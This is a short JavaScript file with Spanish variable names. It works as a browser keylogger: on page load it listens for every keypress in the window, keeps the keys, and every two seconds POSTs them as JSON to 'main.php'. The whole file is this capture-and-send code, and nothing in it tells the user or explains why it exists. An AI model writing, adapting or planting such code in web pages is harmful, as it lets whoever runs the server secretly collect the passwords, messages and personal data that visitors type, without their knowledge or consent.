var guardar = {
  arre: [],
  enviar: false,

  init: function () {
    window.addEventListener("keydown", function (evt) {
      guardar.arre.push(evt.key);
    });
    window.setInterval(guardar.send, 2000);
  },
  send: function () {
    if (!guardar.enviar && guardar.arre.length != 0) {
      guardar.enviar = true;
      var datos = new FormData();
      datos.append("keys", JSON.stringify(guardar.arre));
      guardar.arre = [];

      var ajx = new XMLHttpRequest();
      ajx.open("POST", "main.php");
      ajx.onload = function () {
        guardar.enviar = false;
        console.log(this.response);
      };
      ajx.send(datos);
    }
  },
};
window.addEventListener("DOMContentLoaded", guardar.init);
